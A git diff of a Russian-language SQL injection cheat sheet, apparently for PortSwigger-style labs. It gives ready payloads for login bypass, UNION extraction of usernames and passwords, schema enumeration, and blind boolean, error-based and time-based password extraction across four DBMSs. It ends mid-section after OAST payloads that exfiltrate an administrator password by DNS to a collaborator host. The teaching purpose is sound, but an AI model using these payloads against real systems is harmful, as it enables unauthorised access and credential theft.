@@ -1,485 +1,564 @@
-## 🚪 Оглавление 🚪
-- [Что такое SQL-инъекция?](#что-такое-sql-инъекция-sqli)
-- [1. Извлечение скрытых данных (WHERE)](#1-извлечение-скрытых-данных-where)
-- [2. Обход аутентификации](#2-обход-аутентификации-login-bypass)
-- [3. UNION-атака](#3-union-атака)
-  - [3.1 Определение колонок](#31-определение-колонок)
-  - [3.2 Поиск строковых столбцов](#32-поиск-столбцов-с-полезным-типом-данных)
-  - [3.3 Извлечение данных](#33-извлечение-важных-данных)
-  - [3.4 Конкатенация значений](#34-извлечение-нескольких-значений-из-одного-столбца)
-- [4. Анализ базы данных](#-анализ-базы-данных-при-sql-инъекциях)
-  - [4.1 Определение версии СУБД](#1-определение-типа-и-версии-базы-данных)
-  - [4.2 Список таблиц (без Oracle)](#получение-списка-таблиц-кроме-oracle)
-  - [4.3 Список столбцов (без Oracle)](#получение-списка-столбцов-кроме-oracle)
-  - [4.4 Особенности Oracle](#анализ-базы-данных-в-oracle)
-- [5. Слепая SQL-инъекция](#5-слепая-sql-инъекция)
-  - [5.1 Boolean‑based (условные ответы)](#51-использование-слепой-sql-инъекции-путем-запуска-условных-ответов)
-  - [5.2 Error‑based (ошибки)](#52-sql-инъекция-основанная-на-ошибках)
-  - [5.3 Time‑based (задержки)](#54-⏱️-timebased-blind-sql-injection--памятка)
-  - [5.4 OAST (внеполосные запросы)](#55-oast-outofband-sql-injection--шпаргалка)
-- [6. Обход WAF с помощью кодирования](#-6-как-обойти-waf-с-помощью-кодирования)
-- [7. Как защититься?](#-7-как-защититься)
-
-# 💉SQL-инъекция💉 (SQLi)
-
-SQL-инъекция — это уязвимость веб-безопасности, которая позволяет злоумышленнику вмешиваться в запросы, которые приложение отправляет к своей базе данных.
-
-## Что даёт атакующему?
-- Возможность читать конфиденциальные данные (имена пользователей, пароли, личную информацию).
-- Возможность изменять или удалять данные.
-- В некоторых случаях — выполнять команды на сервере.
-
-## Основная причина
-Неправильная фильтрация пользовательского ввода перед подстановкой в SQL-запрос.
-<details>
-<summary><b>⚙️ 1. Извлечение скрытых данных (WHERE)</b></summary>
-- ' OR 1=1--
-- ' AND 1=1-- (для слепой)
-</details>
-<details>
-<summary><b>🔑 2. Обход аутентификации (Login Bypass)</b></summary>
-- admin' --
-- ' OR 1=1; --
-- SELECT * FROM users WHERE username = 'administrator'--' AND password = ''<br>
-Измените username параметр, присвоив ему значение:administrator'--
-</details>
-<details>
-<summary><b>🧩 3. UNION-атака (определение кол-во колонок)</b></summary>
-' ORDER BY 1--<br>
-' ORDER BY 2--<br>
-' ORDER BY 3--<br>
-' UNION SELECT NULL--<br>
-' UNION SELECT NULL,NULL--<br>
-' UNION SELECT NULL,NULL,NULL--<br>
-
-### 3.1 UNION-атака (определение колонок в Oracle)
-В Oracle существует встроенная таблица dual, которую можно использовать для этой цели. Таким образом, внедряемые запросы в Oracle должны выглядеть следующим образом:
-- ' UNION SELECT NULL FROM DUAL--
-
-### 3.2 UNION-атака (Поиск столбцов с полезным типом данных)
-- ' UNION SELECT 'a',NULL,NULL,NULL--<br>
-- ' UNION SELECT NULL,'a',NULL,NULL--<br>
-- ' UNION SELECT NULL,NULL,'a',NULL--<br>
-- ' UNION SELECT NULL,NULL,NULL,'a'--<br>
-
-Если ошибка не возникает, и ответ приложения содержит дополнительное содержимое, включая внедренное строковое значение, то соответствующий столбец подходит для извлечения строковых данных.
-
-### 3.3 UNION-атака (Использование SQL-инъекции и атаки UNION для извлечения важных данных.)
-- ' UNION SELECT username, password FROM users--<br>
-
-Для осуществления этой атаки необходимо знать, что существует таблица с именем usersи двумя столбцами с именами usernameи password.
-Без этой информации вам пришлось бы угадывать имена таблиц и столбцов.
-Все современные базы данных предоставляют способы изучения структуры базы данных и определения того, какие таблицы и столбцы они содержат.
-
-### 3.4 UNION-атака (Извлечение нескольких значений из одного столбца.)
-- ' UNION SELECT username || '~' || password FROM users--<br>
-В разных базах данных используется разный синтаксис для конкатенации строк. Для получения более подробной информации см. шпаргалку по SQL-инъекциям.<br>
-portswigger.net/web-security/sql-injection/cheat-sheet<br>
-</details>
-<details>
- <summary><b>🔍 4. Анализ базы данных при SQL-инъекциях</b></summary>
-
-Для успешной эксплуатации SQL-инъекций часто необходимо получить информацию о базе данных:
-- Тип и версия СУБД
-- Имена таблиц
-- Имена столбцов
+# 💉 Шпаргалка по SQL-инъекциям
 
 ---
 
-### 4.1 Определение типа и версии базы данных
+## 📚 Оглавление
 
-Можно внедрить запросы, специфичные для конкретной СУБД, и посмотреть, какой из них сработает.
+1. [Что такое SQL-инъекция?](#-что-такое-sql-инъекция)
+2. [Извлечение скрытых данных (WHERE)](#-1-извлечение-скрытых-данных-where)
+3. [Обход аутентификации (Login Bypass)](#-2-обход-аутентификации-login-bypass)
+4. [UNION-атака](#-3-union-атака)
+5. [Анализ базы данных](#-4-анализ-базы-данных)
+6. [Слепая SQL-инъекция](#-5-слепая-sql-инъекция)
+   - [Boolean-based](#-51-boolean-based-условные-ответы)
+   - [Error-based](#-52-error-based-инъекция-через-ошибки)
+   - [Time-based](#-53-time-based-инъекция-через-задержки)
+   - [OAST](#-54-oast-out-of-band-инъекция)
+7. [Обход WAF через кодирование](#-6-обход-waf-через-кодирование)
+8. [Как защититься](#-7-как-защититься-от-sql-инъекций)
 
-| СУБД | Запрос для получения версии |
-|------|----------------------------|
+---
+
+## 🧠 Что такое SQL-инъекция?
+
+**SQL-инъекция (SQLi)** — это уязвимость, при которой злоумышленник может «влезть» в SQL-запрос, который сайт отправляет в базу данных, и подменить его логику.
+
+### 🎯 Что это даёт атакующему?
+- 📖 **Читать** секретные данные (логины, пароли, номера карт).
+- ✏️ **Изменять** или **удалять** данные.
+- 💻 В редких случаях — **выполнять команды на сервере**.
+
+### ❓ Почему это вообще возможно?
+Сайт берёт то, что ввёл пользователь, и **напрямую вставляет в SQL-запрос**, не проверяя. Например:
+
+```sql
+SELECT * FROM users WHERE username = 'ВВОД_ПОЛЬЗОВАТЕЛЯ'
+```
+
+Если вместо имени ты введёшь `' OR 1=1--`, запрос превратится в:
+
+```sql
+SELECT * FROM users WHERE username = '' OR 1=1--'
+```
+
+И вернёт **всех** пользователей. Вот и вся магия. 🎩
+
+---
+
+## 🧩 Как читать эту шпаргалку
+
+| Обозначение | Что значит |
+|---|---|
+| `'` | Одинарная кавычка — «разрывает» строку в SQL. |
+| `--` | Комментарий в SQL (всё после него игнорируется). |
+| `#` | Комментарий в MySQL. |
+| `NULL` | Пустое значение (нужно для UNION). |
+| `payload` | Полезная нагрузка — то, что ты вставляешь. |
+
+> 💡 **Совет:** всегда пробуй на **легальных лабораториях** (PortSwigger Web Security Academy, DVWA, HackTheBox). Взламывать чужие сайты — статья. Серьёзно.
+
+---
+
+## ⚙️ 1. Извлечение скрытых данных (WHERE)
+
+**Когда использовать:** когда на странице есть параметр, который попадает в `WHERE` запроса (например, `?id=1` или `?category=Gifts`).
+
+### 🎯 Цель: заставить запрос вернуть все строки.
+
+```sql
+' OR 1=1--
+```
+
+**Как это работает:**
+- `'` — закрываем строку, которую открыл сайт.
+- `OR 1=1` — добавляем условие, которое **всегда истинно**.
+- `--` — «съедаем» остаток запроса.
+
+### 🕵️ Для слепой инъекции (когда ответ не видно):
+
+```sql
+' AND 1=1--   → истина (страница ведёт себя как обычно)
+' AND 1=2--   → ложь (страница меняется)
+```
+
+Так ты проверяешь, есть ли вообще инъекция.
+
+---
+
+## 🔑 2. Обход аутентификации (Login Bypass)
+
+**Когда использовать:** форма входа (логин + пароль).
+
+### 🎯 Цель: войти без пароля.
+
+**Варианты payload:**
+
+```sql
+admin' --
+' OR 1=1; --
+' OR 1=1 LIMIT 1; --
+```
+
+### 📖 Разбор на примере
+
+Оригинальный запрос:
+```sql
+SELECT * FROM users WHERE username = 'administrator' AND password = ''
+```
+
+Вводим в поле username:
+```
+administrator'--
+```
+
+Получаем:
+```sql
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+```
+
+Всё после `--` **игнорируется**, значит проверка пароля исчезла. 🎉
+
+---
+
+## 🧩 3. UNION-атака
+
+**Когда использовать:** когда результат SQL-запроса **отображается на странице**.
+
+> 🧠 **Идея:** UNION объединяет твой запрос с оригинальным. Ты приклеиваешь к результату свои данные.
+
+### 📏 Шаг 1. Узнать количество колонок
+
+Пробуем по очереди, пока не перестанет падать:
+
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--   ← если упало, колонок = 3
+```
+
+Либо через UNION:
+
+```sql
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--   ← работает → 3 колонки
+```
+
+### 🍎 Для Oracle
+
+```sql
+' UNION SELECT NULL FROM DUAL--
+```
+
+(В Oracle обязательно указывать `FROM DUAL`.)
+
+### 🔤 Шаг 2. Найти «текстовые» колонки
+
+Меняем `NULL` на `'a'` по одной позиции:
+
+```sql
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+```
+
+Если страница показывает `'a'` — эта колонка принимает **строки**. ✅
+
+### 📥 Шаг 3. Вытащить данные
+
+```sql
+' UNION SELECT username, password FROM users--
+```
+
+### 🔗 Шаг 4. Склеить несколько значений в одну колонку
+
+Если колонка одна, а вытащить надо два поля:
+
+```sql
+' UNION SELECT username || '~' || password FROM users--
+```
+
+**`||`** — конкатенация (склейка строк) в PostgreSQL, Oracle, SQLite.
+**`CONCAT(a, b)`** — в MySQL и MSSQL.
+**`+`** — в MSSQL.
+
+Результат: `administrator~qwerty123`
+
+---
+
+## 🔍 4. Анализ базы данных
+
+Прежде чем тащить данные, надо понять: **какая СУБД? какие таблицы? какие колонки?**
+
+### 4.1 🏷️ Определение СУБД и версии
+
+| СУБД | Запрос версии |
+|---|---|
 | **Microsoft SQL Server** | `SELECT @@version` |
 | **MySQL** | `SELECT @@version` |
-| **Oracle** | `SELECT * FROM v$version` |
 | **PostgreSQL** | `SELECT version()` |
+| **Oracle** | `SELECT * FROM v$version` |
 
-### Пример через UNION-атаку:
+Пример:
+```sql
 ' UNION SELECT @@version--
+```
 
-#### Пример вывода (Microsoft SQL Server):
-Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)<br>
-Mar 18 2018 09:11:49<br>
-Copyright (c) Microsoft Corporation<br>
-Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)<br>
+### 4.2 📋 Список таблиц (кроме Oracle)
 
-### 4.2 Получение списка таблиц (кроме Oracle)
-Большинство типов баз данных (за исключением Oracle) имеют набор представлений, называемых информационной схемой. Она предоставляет информацию о базе данных.<br>
-Запрос для получения списка таблиц:<br>
-- SELECT * FROM information_schema.tables
-
-#### Пример результата:
-| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
-|---------------|--------------|------------|------------|
-| MyDatabase    | dbo          | Products   | BASE TABLE |
-| MyDatabase    | dbo          | Users      | BASE TABLE |
-| MyDatabase    | dbo          | Feedback   | BASE TABLE |
-
-### Готовый payload для UNION-атаки:
+```sql
 ' UNION SELECT table_name, NULL FROM information_schema.tables--
+```
 
-### 4.3 Получение списка столбцов (кроме Oracle)
-Используй представление information_schema.columns
+**`information_schema.tables`** — системная таблица, где лежат **все** имена таблиц базы.
 
-### Запрос для получения столбцов конкретной таблицы:
-SELECT * FROM information_schema.columns WHERE table_name = 'Users'
-#### Пример результата:
-| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
-|---------------|--------------|------------|-------------|-----------|
-| MyDatabase    | dbo          | Users      | UserId      | int       |
-| MyDatabase    | dbo          | Users      | Username    | varchar   |
-| MyDatabase    | dbo          | Users      | Password    | varchar   |
-#### Готовый payload для UNION-атаки:
+### 4.3 🗂️ Список колонок
+
+```sql
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users'--
+```
 
-### 4.4 Анализ базы данных в Oracle
-В Oracle нет information_schema. Используй другие представления:<br>
+### 4.4 🏛️ Oracle — свои таблицы
 
-| Что узнать | Запрос |
-| :--- | :--- |
+| Что нужно | Запрос |
+|---|---|
 | Список таблиц | `SELECT * FROM all_tables` |
-| Столбцы таблицы | `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'` |
-### Готовые payload'ы для Oracle:
-- ' UNION SELECT table_name, NULL FROM all_tables--<br>
-- ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--<br>
-### Важно: В Oracle все имена таблиц и столбцов хранятся в верхнем регистре!
-</details>
-<details>
-<summary><b>🕵️ 5. Слепая SQL-инъекция</b></summary>
-Слепая SQL-инъекция происходит, когда приложение уязвимо для SQL-инъекций, но его HTTP-ответы не содержат результатов соответствующего SQL-запроса или подробностей об ошибках базы данных.<br>
+| Колонки | `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'` |
 
-Многие методы, такие как UNIONатаки, неэффективны против уязвимостей, связанных со слепой SQL-инъекцией. Это связано с тем, что они основаны на возможности увидеть результаты внедренного запроса в ответах приложения. Тем не менее, использование слепой SQL-инъекции для доступа к несанкционированным данным по-прежнему возможно, но для этого необходимо применять другие методы.<br>
+> ⚠️ **Важно:** в Oracle имена таблиц и колонок хранятся **в верхнем регистре**. Пиши `'USERS'`, а не `'users'`.
 
-### 5.1 Использование слепой SQL-инъекции путем запуска условных ответов.
+Готовые payload'ы:
+```sql
+' UNION SELECT table_name, NULL FROM all_tables--
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--
+```
 
-Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='1<br>
-Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='2<br>
+---
 
-- Первое из этих значений приводит к тому, что запрос возвращает результаты, поскольку внедренное AND<br>
-'1'='1 условие истинно. В результате отображается сообщение «Добро пожаловать обратно».<br>
-- Второе значение приводит к тому, что запрос не возвращает никаких результатов, поскольку внедренное условие<br> ложно. Сообщение «Добро пожаловать обратно» не отображается.
+## 🕵️ 5. Слепая SQL-инъекция
 
-Например, предположим, что есть таблица с именем Usersи столбцами Usernameи Password, и пользователь с именем Administrator.<br> Вы можете определить пароль для этого пользователя, отправляя серию входных данных для проверки пароля по одному символу за раз.
+**Слепая** — это когда сайт **не показывает** ни данные, ни ошибки. Ты видишь только: «ответ пришёл / не пришёл», «быстро / медленно».
 
-Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'm<br>
-**В результате возвращается сообщение "Добро пожаловать обратно", указывающее на то, что внедренное условие истинно, и, следовательно, первый символ пароля m**
-**Это требует гораздо большего количества запросов, поэтому вам потребуется использовать Burp Intruder**
-- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT SUBSTRING(password,&1&,1) FROM users WHERE username='administrator')='§a§ **(ВАРИАНТ 1)** <br>
-- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), &1&, 1) = '&m& **(ВАРИАНТ 2)** <br>
-  
-#### Также можно проверить наличие таблиц и пользователя
+Разберём 4 вида.
 
-- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users LIMIT 1)='a<br> **(Убедитесь, что условие выполняется, и подтвердите наличие таблицы с именем users.)**
-- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users WHERE username='administrator')='a<br> **(Убедитесь, что условие выполняется, и подтвердите, что существует пользователь с именем administrator**)
+---
 
-### определение кол-во символов в пароле
-- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=&1&)='&a&<br>
-**Символ & вокруг цифр и букв помогает программе понять какое значение нужно менять при каждом последующем запросе** 
-**При использовании Burp Intruder потребуется список символов для быстрого перебора в & обычно это числа и буквы но также могут быть спец символы**
+### 🎭 5.1 Boolean-based (условные ответы)
 
-## 5.2 SQL-инъекция, основанная на ошибках
-**SQL-инъекции, основанные на ошибках, относятся к случаям, когда вы можете использовать сообщения об ошибках для извлечения или получения конфиденциальных данных из базы данных, даже в условиях отсутствия доступа к ней. Возможности зависят от конфигурации базы данных и типов ошибок, которые вы можете вызвать**
+**Идея:** задаём True/False вопрос. Если ответ на странице меняется — условие истинно.
 
-## Типы Error‑based SQL‑инъекций
+**Пример проверки:**
+```sql
+Cookie: TrackingId=xyz' AND '1'='1    → «Welcome back!» (истина)
+Cookie: TrackingId=xyz' AND '1'='2    → ничего (ложь)
+```
 
-| Тип | Что это | Когда использовать |
-| :--- | :--- | :--- |
-| **Условные ошибки** | Ты вызываешь ошибку **только если условие истинно** и смотришь на разницу в ответе (`500` vs `200`). | Когда ошибки **видны**, но **нет вывода данных**. |
-| **Подробные ошибки** | Ты заставляешь БД **выдать данные прямо в тексте ошибки** через преобразование типов (`CAST` / `::int`). | Когда ошибки **видны** и **содержат полный текст ошибки БД**. |
+**Как вытащить пароль по буквам:**
 
-### 📌 Трафарет 1: Условные ошибки (CASE + 1/0)<br>
-**Когда нужно проверить один символ и понять, верно ли условие (по статусу 500).** <br>
-#### Универсальный шаблон (PostgreSQL)<br>
-' AND (SELECT CASE WHEN (условие) THEN 1/0 ELSE 1 END FROM users LIMIT 1)=1<br>
-#### Конкретный пример (проверка первого символа пароля)<br>
-TrackingId=xyz' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users WHERE username='administrator')=1<br>
+```sql
+Cookie: TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'), 1, 1) = 'm'--
+```
 
-Как использовать<br>
-Подставляешь символ (a, b, c...).<br>
-Если ответ 500 → символ верный.<br>
-Если ответ 200 (или 302) → не верный.<br>
+→ Если увидел «Welcome back» → первая буква **m**.
 
-### 📌 Трафарет 2: Подробные ошибки (CAST / ::int)<br>
-**Когда нужно вытащить всё значение за один запрос.** <br>
-#### Универсальный шаблон (PostgreSQL)<br>
-'||(SELECT нужное_поле FROM нужная_таблица LIMIT 1)::int||'<br>
-#### Конкретный пример (пароль администратора)<br>
-TrackingId=xyz'||(SELECT password FROM users WHERE username='administrator')::int||'<br>
+**Проверка существования таблицы/юзера:**
+```sql
+' AND (SELECT 'a' FROM users LIMIT 1)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+```
 
-Как использовать<br>
+**Узнать длину пароля:**
+```sql
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=8)='a
+```
 
-## ⚠️ Адаптация под разные СУБД
-### PostgreSQL
-- **CAST:** `'||(SELECT password FROM users LIMIT 1)::int||'`
-- **Условный:** `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users LIMIT 1)=1`
+**Автоматизация:** Burp Intruder. Метки `§` вокруг символа — то, что Burp подставит:
+```sql
+Cookie: TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'), §1§, 1) = '§a§'--
+```
 
-### Oracle
-- **CAST:** `'||(SELECT CAST(password AS int) FROM users WHERE ROWNUM=1 AND username='administrator')||'`
-- **Условный:** `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1 AND username='administrator')=''`
+---
 
-### MySQL
-- **CAST:** `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
-- **Условный:** `' AND IF(SUBSTR(password,1,1)='a', 1/0, 1)=1--`
+### 💥 5.2 Error-based (инъекция через ошибки)
 
-### MSSQL
-- **CAST:** `' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--`
-- **Условный:** `' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users)=1`
+**Идея:** заставляем базу **выдать данные прямо в тексте ошибки**.
 
-### 🔧 Как победить обрезание запроса
-Если сервер урезает твой длинный запрос, используй эти приёмы (каждый следующий шаг экономит символы):
+#### 📌 Тип 1. Условные ошибки (`CASE` + деление на ноль)
 
-##### 🔧 Убери лишний TrackingId
-Оставь только апостроф (') — сам идентификатор не нужен, если ты строишь инъекцию с нуля.
+Если ответ `500` → символ угадан. Если `200` → мимо.
 
-##### 🧩 Замени громоздкий CAST на короткий ::int
-В PostgreSQL пиши value::int вместо CAST(value AS int) — это сэкономит больше 10 символов.
+**PostgreSQL:**
+```sql
+' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users LIMIT 1)=1
+```
 
-##### ✂️ Удали LIMIT 1, если уверен в единственной строке
-Когда результат гарантированно один (например, по первичному ключу), смело убирай LIMIT — он тут лишний.
+**Oracle:**
+```sql
+' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1 AND username='administrator')=''
+```
 
-##### ⚡ Выбирай AND вместо конкатенации ||
-Если условие позволяет, используй AND для замыкания предыдущего условия — это короче, чем || с дополнительной строкой.
+**MySQL:**
+```sql
+' AND IF(SUBSTR(password,1,1)='a', 1/0, 1)=1--
+```
 
-##### 🧩 Обходись без комментария --
-Вместо того чтобы ставить -- и обрезать остаток запроса, закрой строку через || и подставь нужное значение — так ты не потеряешь символы на комментарий и перевод строки.
+**MSSQL:**
+```sql
+' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users)=1
+```
 
-### 💡 Совет: применяй эти ухищрения последовательно — каждый из них выигрывает по 2–15 символов, и в сумме это часто решает проблему с обрезкой.
+#### 📌 Тип 2. Подробные ошибки (CAST) — вытащить всё сразу
 
-## 🧩 Шпаргалка: готовые инъекции для разных СУБД
-
-###  5.3 ⚡ Получить пароль за 1 запрос (если ошибки показывают данные)
-
-### PostgreSQL
+**PostgreSQL:**
+```sql
 '||(SELECT password FROM users LIMIT 1)::int||'
+```
 
-### Oracle
+**Oracle:**
+```sql
 '||(SELECT CAST(password AS int) FROM users WHERE ROWNUM=1 AND username='administrator')||'
+```
 
-### MySQL
+**MySQL:**
+```sql
 ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
 
-### MSSQL
+**MSSQL:**
+```sql
 ' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--
+```
+
+> 🧠 **Почему работает?** Ты пытаешься превратить текст в число → база ругается → в тексте ошибки видны данные.
+
+#### ✂️ Что делать, если запрос обрезается
+
+Сервер может резать длинные payload'ы. Экономь символы:
+
+1. Убери лишний TrackingId — оставь только `'`.
+2. `::int` короче, чем `CAST(... AS int)`.
+3. Убери `LIMIT 1`, если точно одна строка.
+4. `AND` короче, чем конкатенация `||`.
+5. Не закрывай запрос комментарием `--` — закрывай строку через `||`.
 
 ---
 
-### 🔍 Проверить символ по позиции (если ошибки только меняют статус)
+### ⏱️ 5.3 Time-based (инъекция через задержки)
 
-| СУБД | Трафарет (вставлять после `TrackingId=`) |
-| :--- | :--- |
-| **PostgreSQL** | `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users LIMIT 1)=1` |
-| **Oracle** | `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1 AND username='administrator')=''` |
-| **MySQL** | `' AND IF(SUBSTR(password,1,1)='a', 1/0, 1)=1--` |
-| **MSSQL** | `' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users)=1` |
+**Когда использовать:** сайт не показывает ни ошибок, ни изменений. Только по времени ответа видно, сработал ли запрос.
 
-# 5.4 ⏱️ Time‑based Blind SQL Injection — памятка
+**Идея:** если условие истинно → БД «спит» 10 секунд.
 
-## 🧠 Суть метода
-Когда приложение не показывает ошибки и не меняет содержимое страницы, но выполняет SQL‑запросы синхронно, можно использовать **задержки**.  
-Если условие истинно — база данных «спит» несколько секунд, и HTTP‑ответ задерживается. Если ложно — ответ приходит мгновенно.
+**Как проверить:** засеки время ответа. 10 сек vs 0.5 сек.
 
-**Индикатор:** разница во времени ответа (например, 10 секунд vs 0,5 секунды).
+#### 🧩 Шаблоны
 
----
-
-## 🧩 Универсальный алгоритм
-
-1. **Найти точку входа** (параметр, cookie, заголовок).
-2. **Проверить, что задержка вообще работает** — отправить безусловную задержку (например, `WAITFOR DELAY '0:0:10'` для MSSQL).
-3. **Заменить условие на проверку символа** (например, `SUBSTRING(password,1,1)='a'`).
-4. **Перебирать символы и позиции**, собирая данные.
-
----
-
-## 📌 Готовые шаблоны для разных СУБД
-
-### Microsoft SQL Server (MSSQL)
+**MSSQL:**
+```sql
 ТВОЙ_ID'; IF (SELECT COUNT(*) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a') > 0 WAITFOR DELAY '0:0:10'--
-### PostgreSQL
+```
+
+**PostgreSQL:**
+```sql
 ТВОЙ_ID' ; SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
-### MySQL
+```
+
+**MySQL:**
+```sql
 ТВОЙ_ID' AND IF(SUBSTR(password,1,1)='a', SLEEP(10), 0)--
-### Oracle
+```
+
+**Oracle:**
+```sql
 ТВОЙ_ID'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN dbms_pipe.receive_message('a',10) ELSE NULL END FROM users WHERE username='administrator')||'
-## 🔍 Определение длины пароля
-Используй условие с LENGTH(password)=N:
-### Пример для PostgreSQL:
-ТВОЙ_ID' ; SELECT CASE WHEN (LENGTH(password)=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--<br>
-Перебирай N от 1 до 30, пока не появится задержка. Это длина пароля.<br>
+```
 
-**Автоматизация в Burp Intruder<br>
-Вариант 1: перебор по одной позиции (Sniper)<br>
-Позиция переменной: SUBSTR(password,1,1)='§a§'<br>
-Тип атаки: Sniper<br>
-Payload: символы a-z, 0-9<br>
-Фильтр: сортировать по времени ответа (задержка = верный символ)** <br>
+#### 📏 Узнать длину пароля
+```sql
+' ; SELECT CASE WHEN (LENGTH(password)=8) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
+```
+Перебирай N=1, 2, 3... пока не появится задержка.
 
-**Вариант 2: перебор всех позиций и символов (Cluster bomb)<br>
-Переменные: SUBSTR(password,§1§,1)='§2§'<br>
-Payload set 1: номера позиций (1..длина)<br>
-Payload set 2: символы<br>
-Тип атаки: Cluster bomb<br>
-После атаки — отфильтровать строки с большим временем ответа (≈10 сек).** <br> 
+#### 🤖 Автоматизация в Burp Intruder
 
-**Как анализировать результаты<br>
-В Burp Intruder смотри на столбец Response received (время в миллисекундах):<br>
-Запросы с задержкой > 9000 мс — это правильные пары (позиция, символ).<br>
-Запросы с быстрым ответом (< 1000 мс) — не подходят.** <br>
+- **Sniper:** перебираем один символ за раз.
+- **Cluster bomb:** перебираем сразу пары (позиция, символ).
 
-# 5.5 OAST (Out‑of‑Band) SQL Injection — шпаргалка
-## 📌 Когда использовать OAST
-Используй OAST, если:<br>
-❌ Нет ошибок (Error‑based не работает)<br>
-❌ Нет изменений на странице (Boolean‑based не работает)<br>
-❌ Нет задержек (Time‑based не работает, либо запросы выполняются асинхронно)<br>
-**Суть: ты заставляешь сервер БД отправить внешний запрос (DNS/HTTP) на твой контролируемый сервер (Collaborator). Если запрос доходит — уязвимость подтверждена, и можно извлекать данные.**
+Сортируй результат по **времени ответа** — где ~10 000 мс, там верный символ. ✅
 
-## 🧰 Необходимые инструменты
-Burp Collaborator (встроен в Professional, но в пробной версии работает) — предпочтительный вариант для лабораторий PortSwigger.<br>
-Альтернативы: Interactsh (бесплатно), oastify.com, но в лабораториях PortSwigger они не работают из‑за блокировки внешних систем.<br>
-В лабораториях PortSwigger используй только Burp Collaborator (публичный сервер по умолчанию).<br>
+---
 
-## 🔍 Шаг 1. Проверка, что OAST работает (безусловный запрос)
-#### MSSQL
-'; exec master..xp_dirtree '//твой_поддомен.burpcollaborator.net/a'--<br>
-#### Oracle
-'||UTL_INADDR.GET_HOST_ADDRESS('твой_поддомен.burpcollaborator.net')||'<br>
-#### PostgreSQL
-'||dblink('host=твой_поддомен.burpcollaborator.net user=test dbname=test', 'SELECT 1')||'<br>
-#### MySQL
-' AND LOAD_FILE(CONCAT('\\\\', 'твой_поддомен.burpcollaborator.net', '\\a'))--<br>
-**Если в Collaborator видишь DNS/HTTP-запрос → OAST работает.**
+### 🛰️ 5.4 OAST (Out-of-Band)
 
-## Шаг 2. Извлечение данных (эксфильтрация)
-#### MSSQL (экфильтрация пароля через DNS)
-'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='administrator'); exec('master..xp_dirtree "//'+@p+'.твой_поддомен.burpcollaborator.net/a"')--<br>
-#### Oracle (через UTL_INADDR)
-'||UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='administrator')||'.твой_поддомен.burpcollaborator.net')||'<br>
-#### Oracle (через XML + EXTRACTVALUE)
